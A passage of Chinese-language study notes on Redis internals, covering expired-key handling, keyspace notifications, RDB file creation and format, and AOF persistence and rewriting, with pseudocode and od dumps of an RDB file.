return\n\nactiveExpireCycle函数的工作模式可以总结如下：\n\n函数每次运行时，都从一定数量的数据库中取出一定数量的随机键进行检查，并删除其中的过期键。\n全局变量current_db会记录当前activeExpireCycle函数检查的进度，并在下一次activeExpireCycle函数调用时，接着上一次的进度进行处理。比如说，如果当前activeExpireCycle函数在遍历10号数据库时返回了，那么下次activeExpireCycle函数执行时，将从11号数据库开始查找并删除过期键。\n随着activeExpireCycle函数的不断执行，服务器中的所有数据库都会被检查一遍，这时函数将current_db变量重置为0，然后再次开始新一轮的检查工作。\n\nAOF、RDB和复制功能对过期键的处理看看过期键对Redis服务器中其他模块的影响，看看RDB持久化功能、AOF持久化功能以及复制功能是如何处理数据库中的过期键的。\n生成RDB文件在执行SAVE命令或者BGSAVE命令创建一个新的RDB文件时，程序会对数据库中的键进行检查，已过期的键不会被保存到新创建的RDB文件中。数据库中包含过期键不会对生成新的RDB文件造成影响。\n载入RDB文件在启动Redis服务器时，如果服务器开启了RDB功能，那么服务器将对RDB文件进行载入：\n\n如果服务器以主服务器模式运行，那么在载入RDB文件时，程序会对文件中保存的键进行检查，未过期的键会被载入到数据库中，而过期键则会被忽略，所以过期键对载入RDB文件的主服务器不会造成影响。\n如果服务器以从服务器模式运行，那么在载入RDB文件时，文件中保存的所有键，不论是否过期，都会被载入到数据库中。不过，因为主从服务器在进行数据同步的时候，从服务器的数据库就会被清空，所以一般来讲，过期键对载入RDB文件的从服务器也不会造成影响。\n\nAOF文件写入当服务器以AOF持久化模式运行时，如果数据库中的某个键已经过期，但它还没有被惰性删除或者定期删除，那么AOF文件不会因为这个过期键而产生任何影响。当过期键被惰性删除或者定期删除之后，程序会向AOF文件追加（append）一条DEL命令，来显式地记录该键已被删除。\n举个例子，如果客户端使用GET message命令，试图访问过期的message键，那么服务器将执行以下三个动作：\n\n从数据库中删除message键。\n追加一条DEL message命令到AOF文件。\n向执行GET命令的客户端返回空回复。\n\nAOF重写和生成RDB文件时类似，在执行AOF重写的过程中，程序会对数据库中的键进行检查，已过期的键不会被保存到重写后的AOF文件中。数据库中包含过期键不会对AOF重写造成影响。\n复制当服务器运行在复制模式下时，从服务器的过期键删除动作由主服务器控制：\n\n主服务器在删除一个过期键之后，会显式地向所有从服务器发送一个DEL命令，告知从服务器删除这个过期键。\n从服务器在执行客户端发送的读命令时，即使碰到过期键也不会将过期键删除，而是继续像处理未过期的键一样来处理过期键。\n从服务器只有在接到主服务器发来的DEL命令之后，才会删除过期键。\n\n通过由主服务器来控制从服务器统一地删除过期键，可以保证主从服务器数据的一致性，也正是因为这个原因，当一个过期键仍然存在于主服务器的数据库时，这个过期键在从服务器里的复制品也会继续存在。\n在主从复制中，数据一致性至关重要。 主从服务器常用于读写分离，允许从服务器延迟一定的状态同步来提升读性能。\n数据库通知数据库通知是Redis 2.8版本新增加的功能，这个功能可以让客户端通过订阅给定的频道或者模式，来获知数据库中键的变化，以及数据库中命令的执行情况。\n关注“某个键执行了什么命令”的通知称为键空间通知（key-space notification），除此之外，还有另一类称为键事件通知（key-event notification） 的通知，它们关注的是“某个命令被什么键执行了”。\n服务器配置的 notify-keyspace-events 选项决定了服务器所发送通知的类型：\nK     Keyspace events, published with __keyspace@&lt;db&gt;__ prefix.E     Keyevent events, published with __keyevent@&lt;db&gt;__ prefix.g     Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...$     String commandsl     List commandss     Set commandsh     Hash commandsz     Sorted set commandst     Stream commandsd     Module key type eventsx     Expired events (events generated every time a key expires)e     Evicted events (events generated when a key is evicted for maxmemory)m     Key miss events (events generated when a key that doesn&#x27;t exist is accessed)n     New key events (Note: not included in the &#x27;A&#x27; class)A     Alias for &quot;g$lshztxed&quot;, so that the &quot;AKE&quot; string means all the events except &quot;m&quot; and &quot;n&quot;.\n\n更多设置信息，可以参考官方文档：Redis keyspace notifications。\n发送通知发送数据库通知的功能是由notify.c&#x2F;notifyKeyspaceEvent函数实现的： void notifyKeyspaceEvent(int type,char *event,robj *key,int dbid);\n函数的 type 参数是当前想要发送的通知的类型，程序会根据这个值来判断通知是否就是服务器配置 notify-keyspace-events 选项所选定的通知类型，从而决定是否发送通知。event、keys 和 dbid 分别是事件的名称、产生事件的键，以及产生事件的数据库号码，函数会根据 type 参数以及这三个参数来构建事件通知的内容，以及接收通知的频道名。每当一个Redis命令需要发送数据库通知的时候，该命令的实现函数就会调用 notify-KeyspaceEvent 函数，并向函数传递传递该命令所引发的事件的相关信息。\n发送通知的实现以下是notifyKeyspaceEvent函数的伪代码实现：\ndef notifyKeyspaceEvent(type, event, key, dbid):    # 如果给定的通知不是服务器允许发送的通知，那么直接返回    if not (server.notify_keyspace_events &amp; type):        return    # 发送键空间通知    if server.notify_keyspace_events &amp; REDIS_NOTIFY_KEYSPACE:        # 将通知发送给频道__keyspace@&lt;dbid&gt;__:&lt;key&gt;        # 内容为键所发生的事件 &lt;event&gt;        # 构建频道名字        chan = &quot;__keyspace@&#123;dbid&#125;__:&#123;key&#125;&quot;.format(dbid=dbid, key=key)        # 发送通知        pubsubPublishMessage(chan, event)    # 发送键事件通知    if server.notify_keyspace_events &amp; REDIS_NOTIFY_KEYEVENT:        # 将通知发送给频道__keyevent@&lt;dbid&gt;__:&lt;event&gt;        # 内容为发生事件的键 &lt;key&gt;        # 构建频道名字        chan = &quot;__keyevent@&#123;dbid&#125;__:&#123;event&#125;&quot;.format(dbid=dbid, event=event)        # 发送通知        pubsubPublishMessage(chan, key)\n\nnotifyKeyspaceEvent 函数执行以下操作：\n\nserver.notify_keyspace_events 属性就是服务器配置 notify-keyspace-events 选项所设置的值，如果给定的通知类型type不是服务器允许发送的通知类型，那么函数会直接返回，不做任何动作。\n如果给定的通知是服务器允许发送的通知，那么下一步函数会检测服务器是否允许发送键空间通知，如果允许的话，程序就会构建并发送事件通知。\n最后，函数检测服务器是否允许发送键事件通知，如果允许的话，程序就会构建并发送事件通知。\n\n另外，pubsubPublishMessage 函数是 PUBLISH 命令的实现函数，执行这个函数等同于执行PUBLISH命令，订阅数据库通知的客户端收到的信息就是由这个函数发出的。\n第十章 - RDB持久化Redis是一个键值对数据库服务器，服务器中通常包含着任意个非空数据库，而每个非空数据库中又可以包含任意个键值对，为了方便起见，我们将服务器中的非空数据库以及它们的键值对统称为数据库状态。\n下面展示了一个包含三个非空数据库的Redis服务器，这三个数据库以及数据库中的键值对就是该服务器的数据库状态。\n\n因为Redis是内存数据库，它将自己的数据库状态储存在内存里面，所以如果不想办法将储存在内存中的数据库状态保存到磁盘里面，那么一旦服务器进程退出，服务器中的数据库状态也会消失不见。为了解决这个问题，Redis提供了RDB持久化功能，这个功能可以将Redis在内存中的数据库状态保存到磁盘里面，避免数据意外丢失。\nRDB持久化既可以手动执行，也可以根据服务器配置选项定期执行，该功能可以将某个时间点上的数据库状态保存到一个RDB文件中。RDB持久化功能所生成的RDB文件是一个经过压缩的二进制文件，通过该文件可以还原生成RDB文件时的数据库状态。\n因为RDB文件是保存在硬盘里面的，所以即使Redis服务器进程退出，甚至运行Redis服务器的计算机停机，但只要RDB文件仍然存在，Redis服务器就可以用它来还原数据库状态。\nRDB文件的创建与载入有两个Redis命令可以用于生成RDB文件，一个是SAVE，另一个是BGSAVE。\nSAVE命令会阻塞Redis服务器进程，直到RDB文件创建完毕为止，在服务器进程阻塞期间，服务器不能处理任何命令请求。和SAVE命令直接阻塞服务器进程的做法不同，BGSAVE命令会派生出一个子进程，然后由子进程负责创建RDB文件，服务器进程（父进程）继续处理命令请求。\n创建RDB文件的实际工作由rdb.c&#x2F;rdbSave函数完成，SAVE命令和BGSAVE命令会以不同的方式调用这个函数，通过以下伪代码可以明显地看出这两个命令之间的区别：\ndef SAVE():    # 创建RDB文件    rdbSave()def BGSAVE():    # 创建子进程    pid = fork()    if pid == 0:        # 子进程负责创建RDB文件        rdbSave()        # 完成之后向父进程发送信号        signal_parent()    elif pid &gt; 0:        # 父进程继续处理命令请求，并通过轮询等待子进程的信号        handle_request_and_wait_signal()    else:        # 处理出错情况        handle_fork_error()\n\n和使用SAVE命令或者BGSAVE命令创建RDB文件不同，RDB文件的载入工作是在服务器启动时自动执行的，所以Redis并没有专门用于载入RDB文件的命令，只要Redis服务器在启动时检测到RDB文件存在，它就会自动载入RDB文件。\n另外值得一提的是，因为AOF文件的更新频率通常比RDB文件的更新频率高，所以：\n\n如果服务器开启了AOF持久化功能，那么服务器会优先使用AOF文件来还原数据库状态。\n只有在AOF持久化功能处于关闭状态时，服务器才会使用RDB文件来还原数据库状态。\n\nSAVE命令执行时的服务器状态前面提到过，当SAVE命令执行时，Redis服务器会被阻塞，所以当SAVE命令正在执行时，客户端发送的所有命令请求都会被拒绝。只有在服务器执行完SAVE命令、重新开始接受命令请求之后，客户端发送的命令才会被处理。\nBGSAVE命令执行时的服务器状态因为 BGSAVE 命令的保存工作是由子进程执行的，所以在子进程创建 RDB 文件的过程中， Redis 服务器仍然可以继续处理客户端的命令请求。但是，在 BGSAVE 命令执行期间，服务器处理 SAVE 、 BGSAVE 、 BGREWRITEAOF 三个命令的方式会和平时有所不同。\n首先，在 BGSAVE 命令执行期间，客户端发送的 SAVE 命令会被服务器拒绝，服务器禁止 SAVE 命令和 BGSAVE 命令同时执行是为了避免父进程（服务器进程）和子进程同时执行两个 rdbSave 调用，防止产生竞争条件。其次，在 BGSAVE 命令执行期间，客户端发送的 BGSAVE 命令会被服务器拒绝，因为同时执行两个 BGSAVE 命令也会产生竞争条件。最后， BGREWRITEAOF 和 BGSAVE 两个命令不能同时执行：\n\n如果 BGSAVE 命令正在执行，那么客户端发送的 BGREWRITEAOF 命令会被延迟到 BGSAVE 命令执行完毕之后执行。\n如果 BGREWRITEAOF 命令正在执行，那么客户端发送的 BGSAVE 命令会被服务器拒绝。\n\n因为 BGREWRITEAOF 和 BGSAVE 两个命令的实际工作都由子进程执行，所以这两个命令在操作方面并没有什么冲突的地方。不能同时执行它们只是一个性能方面的考虑——并发出两个子进程，并且这两个子进程都同时执行大量的磁盘写入操作，这怎么想都不会是一个好主意。\nRDB文件载入时的服务器状态服务器在载入RDB文件期间，会一直处于阻塞状态，直到载入工作完成为止。\n自动间隔性保存SAVE命令由服务器进程执行保存工作，BGSAVE命令则由子进程执行保存工作，所以SAVE命令会阻塞服务器，而BGSAVE命令则不会。\n因为BGSAVE命令可以在不阻塞服务器进程的情况下执行，所以Redis允许用户通过设置服务器配置的save选项，让服务器每隔一段时间自动执行一次BGSAVE命令。用户可以通过save选项设置多个保存条件，但只要其中任意一个条件被满足，服务器就会执行BGSAVE命令。\n设置保存条件当Redis服务器启动时，用户可以通过指定配置文件或者传入启动参数的方式设置save选项，如果用户没有主动设置save选项，那么服务器会为save选项设置默认条件：\nsave 900 1save 300 10save 60 10000\n\n\n服务器在900秒之内，对数据库进行了至少1次修改。\n服务器在300秒之内，对数据库进行了至少10次修改。\n服务器在60秒之内，对数据库进行了至少10000次修改。\n\n接着，服务器程序会根据save选项所设置的保存条件，设置服务器状态redisServer结构的saveparams属性：\nstruct redisServer &#123;    // ...    // 记录了保存条件的数组    struct saveparam *saveparams;    // ...&#125;;\n\nsaveparams属性是一个数组，数组中的每个元素都是一个saveparam结构，每个saveparam结构都保存了一个save选项设置的保存条件：\nstruct saveparam &#123;    // 秒数    time_t seconds;    // 修改数    int changes;&#125;;\n\ndirty 计数器和 lastsave 属性除了 saveparams 数组之外，服务器状态还维持着一个 dirty 计数器，以及一个 lastsave 属性：\n\ndirty 计数器记录距离上一次成功执行 SAVE 命令或者 BGSAVE 命令之后，服务器对数据库状态（服务器中的所有数据库）进行了多少次修改（包括写入、删除、更新等操作）。\nlastsave 属性是一个 UNIX 时间戳，记录了服务器上一次成功执行 SAVE 命令或者 BGSAVE 命令的时间。\n\nstruct redisServer &#123;    // ...    // 修改计数器    long long dirty;    // 上一次执行保存的时间    time_t lastsave;    // ...&#125;;\n\n当服务器成功执行一个数据库修改命令之后，程序就会对dirty计数器进行更新：命令修改了多少次数据库，dirty计数器的值就增加多少。\n检查保存条件是否满足Redis的服务器周期性操作函数serverCron默认每隔100毫秒就会执行一次，该函数用于对正在运行的服务器进行维护，它的其中一项工作就是检查save选项所设置的保存条件是否已经满足，如果满足的话，就执行BGSAVE命令。\n以下伪代码展示了serverCron函数检查保存条件的过程：\ndef serverCron():    # ...    # 遍历所有保存条件    for saveparam in server.saveparams:        # 计算距离上次执行保存操作有多少秒        save_interval = unixtime_now() - server.lastsave        # 如果数据库状态的修改次数超过条件所设置的次数        # 并且距离上次保存的时间超过条件所设置的时间        # 那么执行保存操作        if server.dirty &gt;= saveparam.changes and save_interval &gt; saveparam.seconds:            BGSAVE()    # ...\n\n程序会遍历并检查saveparams数组中的所有保存条件，只要有任意一个条件被满足，那么服务器就会执行BGSAVE命令。\nRDB文件结构RDB文件结构如下：\n\nRDB文件的最开头是REDIS部分，这个部分的长度为5字节，保存着“REDIS”五个字符。通过这五个字符，程序可以在载入文件时，快速检查所载入的文件是否RDB文件。因为RDB文件保存的是二进制数据，而不是C字符串，为了简便起见，我们用”REDIS”符号代表’R’、’E’、’D’、’I’、’S’五个字符，而不是带’\\0’结尾符号的C字符串’R’、’E’、’D’、’I’、’S’、’\\0’。后续关于RDB文件的结构都是这样。\ndb_version长度为4字节，它的值是一个字符串表示的整数，这个整数记录了RDB文件的版本号，比如”0006”就代表RDB文件的版本为第六版。这里介绍的也是第六版RDB文件的结构。（虽然我看这本书的时候，redis最新版本已经是7.4.1了。）databases部分包含着零个或任意多个数据库，以及各个数据库中的键值对数据：\n\n如果服务器的数据库状态为空（所有数据库都是空的），那么这个部分也为空，长度为0字节。\n如果服务器的数据库状态为非空（有至少一个数据库非空），那么这个部分也为非空，根据数据库所保存键值对的数量、类型和内容不同，这个部分的长度也会有所不同。\n\nEOF常量的长度为1字节，这个常量标志着RDB文件正文内容的结束，当读入程序遇到这个值的时候，它知道所有数据库的所有键值对都已经载入完毕了。check_sum是一个8字节长的无符号整数，保存着一个校验和，这个校验和是程序通过对REDIS、db_version、databases、EOF四个部分的内容进行计算得出的。服务器在载入RDB文件时，会将载入数据所计算出的校验和与check_sum所记录的校验和进行对比，以此来检查RDB文件是否有出错或者损坏的情况出现。\ndatabases部分一个RDB文件的databases部分可以保存任意多个非空数据库。\n例如，如果服务器的0号数据库和3号数据库非空，那么服务器将创建一个如图所示的RDB文件，图中的database 0代表0号数据库中的所有键值对数据，而database 3则代表3号数据库中的所有键值对数据。\n\n每个非空数据库在RDB文件中都可以保存为SELECTDB、db_number、key_value_pairs三个部分。\n\nSELECTDB常量的长度为1字节，当读入程序遇到这个值的时候，它知道接下来要读入的将是一个数据库号码。db_number保存着一个数据库号码，根据号码的大小不同，这个部分的长度可以是1字节、2字节或者5字节。当程序读入db_number部分之后，服务器会调用SELECT命令，根据读入的数据库号码进行数据库切换，使得之后读入的键值对可以载入到正确的数据库中。key_value_pairs部分保存了数据库中的所有键值对数据，如果键值对带有过期时间，那么过期时间也会和键值对保存在一起。根据键值对的数量、类型、内容以及是否有过期时间等条件的不同，key_value_pairs部分的长度也会有所不同。\nkey_value_pairs部分RDB文件中的每个key_value_pairs部分都保存了一个或以上数量的键值对，如果键值对带有过期时间的话，那么键值对的过期时间也会被保存在内。\n不带过期时间的键值对在RDB文件中由TYPE、key、value三部分组成。\nTYPE记录了value的类型，长度为1字节，值可以是以下常量的其中一个：\n\nREDIS_RDB_TYPE_STRING\nREDIS_RDB_TYPE_LIST\nREDIS_RDB_TYPE_SET\nREDIS_RDB_TYPE_ZSET\nREDIS_RDB_TYPE_HASH\nREDIS_RDB_TYPE_LIST_ZIPLIST\nREDIS_RDB_TYPE_SET_INTSET\nREDIS_RDB_TYPE_ZSET_ZIPLIST\nREDIS_RDB_TYPE_HASH_ZIPLIST\n\n以上列出的每个TYPE常量都代表了一种对象类型或者底层编码，当服务器读入RDB文件中的键值对数据时，程序会根据TYPE的值来决定如何读入和解释value的数据。key和value分别保存了键值对的键对象和值对象：\n\n其中key总是一个字符串对象，它的编码方式和REDIS_RDB_TYPE_STRING类型的value一样。根据内容长度的不同，key的长度也会有所不同。\n根据TYPE类型的不同，以及保存内容长度的不同，保存value的结构和长度也会有所不同，稍后会详细说明每种TYPE类型的value结构保存方式。\n\n带有过期时间的键值对在RDB文件中由EXPIRETIME_MS、ms、TYPE、key、value五部分组成。\n\nEXPIRETIME_MS常量的长度为1字节，它告知读入程序，接下来要读入的将是一个以毫秒为单位的过期时间。\nms是一个8字节长的带符号整数，记录着一个以毫秒为单位的UNIX时间戳，这个时间戳就是键值对的过期时间。\n\nvalue的编码RDB文件中的每个value部分都保存了一个值对象，每个值对象的类型都由与之对应的TYPE记录，根据类型的不同，value部分的结构、长度也会有所不同。\n字符串对象如果TYPE的值为REDIS_RDB_TYPE_STRING，那么value保存的就是一个字符串对象，字符串对象的编码可以是REDIS_ENCODING_INT或者REDIS_ENCODING_RAW。\n如果字符串对象的编码为REDIS_ENCODING_INT，那么说明对象中保存的是长度不超过32位的整数。其中，ENCODING的值可以是REDIS_RDB_ENC_INT8、REDIS_RDB_ENC_INT16或者REDIS_RDB_ENC_INT32三个常量的其中一个，它们分别代表RDB文件使用8位（bit）、16位或者32位来保存整数值integer。\nINT编码字符串对象的保存结构\n如果字符串对象的编码为REDIS_ENCODING_RAW，那么说明对象所保存的是一个字符串值，根据字符串长度的不同，有压缩和不压缩两种方法来保存这个字符串：\n\n如果字符串的长度小于等于20字节，那么这个字符串会直接被原样保存。\n如果字符串的长度大于20字节，那么这个字符串会被压缩之后再保存。\n\n以上两个条件是在假设服务器打开了RDB文件压缩功能的情况下进行的，如果服务器关闭了RDB文件压缩功能，那么RDB程序总以无压缩的方式保存字符串值。具体信息可以参考redis.conf文件中关于rdbcompression选项的说明。\n对于没有被压缩的字符串，RDB程序会以下图所示的结构来保存该字符串。\n其中，string部分保存了字符串值本身，而len保存了字符串值的长度。对于压缩后的字符串，RDB程序会以下图所示的结构来保存该字符串。\n其中，REDIS_RDB_ENC_LZF常量标志着字符串已经被LZF算法压缩过了，读入程序在碰到这个常量时，会根据之后的compressed_len、origin_len和compressed_string三部分，对字符串进行解压缩：其中compressed_len记录的是字符串被压缩之后的长度，而origin_len记录的是字符串原来的长度，compressed_string记录的则是被压缩之后的字符串。\n列表对象如果TYPE的值为REDIS_RDB_TYPE_LIST，那么value保存的就是一个REDIS_ENCODING_LINKEDLIST编码的列表对象，RDB文件保存这种对象的结构如下图所示。\nlist_length记录了列表的长度，它记录列表保存了多少个项（item），读入程序可以通过这个长度知道自己应该读入多少个列表项。图中以item开头的部分代表列表的项，因为每个列表项都是一个字符串对象，所以程序会以处理字符串对象的方式来保存和读入列表项。\n集合对象如果TYPE的值为REDIS_RDB_TYPE_SET，那么value保存的就是一个REDIS_ENCODING_HT编码的集合对象，RDB文件保存这种对象的结构如下图所示。\n其中，set_size是集合的大小，它记录集合保存了多少个元素，读入程序可以通过这个大小知道自己应该读入多少个集合元素。图中以elem开头的部分代表集合的元素，因为每个集合元素都是一个字符串对象，所以程序会以处理字符串对象的方式来保存和读入集合元素。\n哈希表对象如果TYPE的值为REDIS_RDB_TYPE_HASH，那么value保存的就是一个REDIS_ENCODING_HT编码的集合对象，RDB文件保存这种对象的结构下图所示：\n\nhash_size记录了哈希表的大小，也即是这个哈希表保存了多少键值对，读入程序可以通过这个大小知道自己应该读入多少个键值对。\n以key_value_pair开头的部分代表哈希表中的键值对，键值对的键和值都是字符串对象，所以程序会以处理字符串对象的方式来保存和读入键值对。\n\n\n结构中的每个键值对（key_value_pair）都以键紧挨着值的方式排列在一起。\n有序集合对象如果TYPE的值为REDIS_RDB_TYPE_ZSET，那么value保存的就是一个REDIS_ENCODING_SKIPLIST编码的有序集合对象，RDB文件保存这种对象的结构如图10-34所示。\nsorted_set_size记录了有序集合的大小，也即是这个有序集合保存了多少元素，读入程序需要根据这个值来决定应该读入多少有序集合元素。以element开头的部分代表有序集合中的元素，每个元素又分为成员（member）和分值（score）两部分，成员是一个字符串对象，分值则是一个double类型的浮点数，程序在保存RDB文件时会先将分值转换成字符串对象，然后再用保存字符串对象的方法将分值保存起来。\nINTSET编码的集合如果TYPE的值为REDIS_RDB_TYPE_SET_INTSET，那么value保存的就是一个整数集合对象，RDB文件保存这种对象的方法是，先将整数集合转换为字符串对象，然后将这个字符串对象保存到RDB文件里面。如果程序在读入RDB文件的过程中，碰到由整数集合对象转换成的字符串对象，那么程序会根据TYPE值的指示，先读入字符串对象，再将这个字符串对象转换成原来的整数集合对象。\nZIPLIST编码的列表、哈希表或者有序集合如果TYPE的值为REDIS_RDB_TYPE_LIST_ZIPLIST、REDIS_RDB_TYPE_HASH_ZIPLIST或者REDIS_RDB_TYPE_ZSET_ZIPLIST，那么value保存的就是一个压缩列表对象，RDB文件保存这种对象的方法是：\n\n将压缩列表转换成一个字符串对象。\n将转换所得的字符串对象保存到RDB文件。\n\n如果程序在读入RDB文件的过程中，碰到由压缩列表对象转换成的字符串对象，那么程序会根据TYPE值的指示，执行以下操作：\n\n读入字符串对象，并将它转换成原来的压缩列表对象。\n根据TYPE的值，设置压缩列表对象的类型：如果TYPE的值为REDIS_RDB_TYPE_LIST_ZIPLIST，那么压缩列表对象的类型为列表；如果TYPE的值为REDIS_RDB_TYPE_HASH_ZIPLIST，那么压缩列表对象的类型为哈希表；如果TYPE的值为REDIS_RDB_TYPE_ZSET_ZIPLIST，那么压缩列表对象的类型为有序集合。\n\n从步骤2可以看出，由于TYPE的存在，即使列表、哈希表和有序集合三种类型都使用压缩列表来保存，RDB读入程序也总可以将读入并转换之后得出的压缩列表设置成原来的类型。\n分析RDB文件使用od命令来分析Redis服务器产生的RDB文件，该命令可以用给定的格式转存（dump）并打印输入文件。比如说，给定-c参数可以以ASCII编码的方式打印输入文件，给定-x参数可以以十六进制的方式打印输入文件，诸如此类，具体的信息可以参考od命令的文档。\n不包含任何键值对的RDB文件使用 FLUSHALL 清空数据库，使用 SAVE 创建一个数据库状态为空的RDB文件。使用od命令，打印RDB文件：\nroot@b9283e6096c1:/data# od -c dump.rdb0000000   R   E   D   I   S   0   0   1   2 372  \\t   r   e   d   i   s0000020   -   v   e   r 005   7   .   4   .   1 372  \\n   r   e   d   i0000040   s   -   b   i   t   s 300   @ 372 005   c   t   i   m   e 3020000060   g   d   1   g 372  \\b   u   s   e   d   -   m   e   m 302   X0000100 316 021  \\0 372  \\b   a   o   f   -   b   a   s   e 300  \\0 3770000120 272 257 332 306 334 330 026   w0000130\n\n第 7 版中新增加的操作符，以 0xFA （372 8进制） 作为标志。可以存放多组 key-value，用来表示对应元信息。每一对 key-value，都以0xFA 开头。key 和 value 均采用 rdb 字符串编码方法。 默认元信息列表：\n\nredis-ver：redis 版本信息。\nredis-bits：输出 rdb 文件机器的位数，64bit 或 32 bit。\nctime：rdb 文件创建时间。\nused-mem：rdb 加载到内存中的内存使用量。\n\n包含字符串键的RDB文件root@b9283e6096c1:/data# od -c dump.rdb0000000   R   E   D   I   S   0   0   1   2 372  \\t   r   e   d   i   s0000020   -   v   e   r 005   7   .   4   .   1 372  \\n   r   e   d   i0000040   s   -   b   i   t   s 300   @ 372 005   c   t   i   m   e 3020000060   /   r   1   g 372  \\b   u   s   e   d   -   m   e   m 302   H0000100 220 022  \\0 372  \\b   a   o   f   -   b   a   s   e 300  \\0 3760000120  \\0 373 001  \\0  \\0 003   m   s   g 005   h   e   l   l   o 3770000140   g 270   o   c 003 235   ~   f0000150\n\n这里由于每个版本的格式并不一致，所以就不详细解读了。（书中版本较老，新版本加了很多东西）可以参考这篇文章：Redis RDB 文件格式解析\n第十一章 - AOF持久化除了RDB持久化功能之外，Redis还提供了AOF（Append Only File）持久化功能。与RDB持久化通过保存数据库中的键值对来记录数据库状态不同，AOF持久化是通过保存Redis服务器所执行的写命令来记录数据库状态的。\nRDB持久化保存数据库状态的方法是将msg、fruits、numbers三个键的键值对保存到RDB文件中。而AOF持久化保存数据库状态的方法则是将服务器执行的SET、SADD、RPUSH三个命令保存到AOF文件中。\n被写入AOF文件的所有命令都是以Redis的命令请求协议格式（纯文本格式）保存的。\nAOF持久化的实现AOF持久化功能的实现可以分为命令追加（append）、文件写入、文件同步（sync）三个步骤。\n命令追加当AOF持久化功能处于打开状态时，服务器在执行完一个写命令之后，会以协议格式将被执行的写命令追加到服务器状态的aof_buf缓冲区的末尾。\nAOF文件的写入与同步Redis的服务器进程就是一个事件循环（loop），这个循环中的文件事件负责接收客户端的命令请求，以及向客户端发送命令回复，而时间事件则负责执行像serverCron函数这样需要定时运行的函数。\n因为服务器在处理文件事件时可能会执行写命令，使得一些内容被追加到aof_buf缓冲区里面，所以在服务器每次结束一个事件循环之前，它都会调用flushAppendOnlyFile函数，考虑是否需要将aof_buf缓冲区中的内容写入和保存到AOF文件里面，这个过程可以用以下伪代码表示：\ndef eventLoop():    while True:        # 处理文件事件，接收命令请求以及发送命令回复        # 处理命令请求时可能会有新内容被追加到 aof_buf 缓冲区中        processFileEvents()        # 处理时间事件        processTimeEvents()        # 考虑是否要将 aof_buf 中的内容写入和保存到 AOF 文件里面        flushAppendOnlyFile()\n\nflushAppendOnlyFile 函数的行为由服务器配置的 appendfsync 选项的值来决定，各个不同值产生的行为。\n\n\n\nappendonly 选项的值\nflushAppendonlyFile 函数的行为\n\n\n\nalways\n将 aof_buf 缓冲区中的所有内容写入并同步到 AOF 文件，确保数据实时持久化。\n\n\neverysec\n将 aof_buf 缓冲区中的所有内容写入 AOF 文件，每隔一秒钟检查上次同步时间，如果超过一秒则再次同步。同步由一个独立线程负责执行，以减少阻塞。\n\n\nno\n将 aof_buf 缓冲区中的所有内容写入 AOF 文件，但不立即同步，何时同步由操作系统决定，可能在后台缓冲区写满或其他条件下触发。\n\n\n如果用户没有主动为appendfsync选项设置值，那么appendfsync选项的默认值为everysec，关于appendfsync选项的更多信息，请参考Redis项目附带的示例配置文件redis.conf。\n文件的写入和同步为了提高文件的写入效率，在现代操作系统中，当用户调用write函数，将一些数据写入到文件的时候，操作系统通常会将写入数据暂时保存在一个内存缓冲区里面，等到缓冲区的空间被填满、或者超过了指定的时限之后，才真正地将缓冲区中的数据写入到磁盘里面。这种做法虽然提高了效率，但也为写入数据带来了安全问题，因为如果计算机发生停机，那么保存在内存缓冲区里面的写入数据将会丢失。为此，系统提供了fsync和fdatasync两个同步函数，它们可以强制让操作系统立即将缓冲区中的数据写入到硬盘里面，从而确保写入数据的安全性。\nAOF持久化的效率和安全性服务器配置appendfsync选项的值直接决定AOF持久化功能的效率和安全性。\n\n当appendfsync的值为always时，服务器在每个事件循环都要将aof_buf缓冲区中的所有内容写入到AOF文件，并且同步AOF文件，所以always的效率是appendfsync选项三个值当中最慢的一个，但从安全性来说，always也是最安全的，因为即使出现故障停机，AOF持久化也只会丢失一个事件循环中所产生的命令数据。\n当appendfsync的值为everysec时，服务器在每个事件循环都要将aof_buf缓冲区中的所有内容写入到AOF文件，并且每隔一秒就要在子线程中对AOF文件进行一次同步。从效率上来讲，everysec模式足够快，并且就算出现故障停机，数据库也只丢失一秒钟的命令数据。\n当appendfsync的值为no时，服务器在每个事件循环都要将aof_buf缓冲区中的所有内容写入到AOF文件，至于何时对AOF文件进行同步，则由操作系统控制。因为处于no模式下的flushAppendOnlyFile调用无须执行同步操作，所以该模式下的AOF文件写入速度总是最快的，不过因为这种模式会在系统缓存中积累一段时间的写入数据，所以该模式的单次同步时长通常是三种模式中时间最长的。从平摊操作的角度来看，no模式和everysec模式的效率类似，当出现故障停机时，使用no模式的服务器将丢失上次同步AOF文件之后的所有写命令数据。\n\nAOF文件的载入与数据还原因为AOF文件里面包含了重建数据库状态所需的所有写命令，所以服务器只要读入并重新执行一遍AOF文件里面保存的写命令，就可以还原服务器关闭之前的数据库状态。\nRedis读取AOF文件并还原数据库状态的详细步骤如下：\n\n创建一个不带网络连接的伪客户端（fake client）：因为Redis的命令只能在客户端上下文中执行，而载入AOF文件时所使用的命令直接来源于AOF文件而不是网络连接，所以服务器使用了一个没有网络连接的伪客户端来执行AOF文件保存的写命令，伪客户端执行命令的效果和带网络连接的客户端执行命令的效果完全一样。\n从AOF文件中分析并读取出一条写命令。\n使用伪客户端执行被读出的写命令。\n一直执行步骤2和步骤3，直到AOF文件中的所有写命令都被处理完毕为止。\n\nAOF重写因为AOF持久化是通过保存被执行的写命令来记录数据库状态的，所以随着服务器运行时间的流逝，AOF文件中的内容会越来越多，文件的体积也会越来越大。如果不加以控制的话，体积过大的AOF文件很可能对Redis服务器、甚至整个宿主计算机造成影响，并且AOF文件的体积越大，使用AOF文件来进行数据还原所需的时间就越多。\n为了解决AOF文件体积膨胀的问题，Redis提供了AOF文件重写（rewrite）功能。通过该功能，Redis服务器可以创建一个新的AOF文件来替代现有的AOF文件，新旧两个AOF文件所保存的数据库状态相同，但新AOF文件不会包含任何浪费空间的冗余命令，所以新AOF文件的体积通常会比旧AOF文件的体积要小得多。\nAOF文件重写的实现虽然Redis将生成新AOF文件替换旧AOF文件的功能命名为“AOF文件重写”，但实际上，AOF文件重写并不需要对现有的AOF文件进行任何读取、分析或者写入操作，这个功能是通过读取服务器当前的数据库状态来实现的。AOF重写功能的实现原理是 从数据库中读取键现在的值，然后用一条命令去记录键值对，代替之前记录这个键值对的多条命令。从而减少新AOF文件的体积。\ndef aof_rewrite(new_aof_file_name):    # 创建新 AOF 文件    f = create_file(new_aof_file_name)    # 遍历数据库    for db in redisServer.db:        # 忽略空数据库        if db.is_empty(): continue        # 写入SELECT命令，指定数据库号码        f.write_command(&quot;SELECT&quot; + db.id)        # 遍历数据库中的所有键        for key in db:            # 忽略已过期的键            if key.is_expired(): continue            # 根据键的类型对键进行重写            if key.type == String: 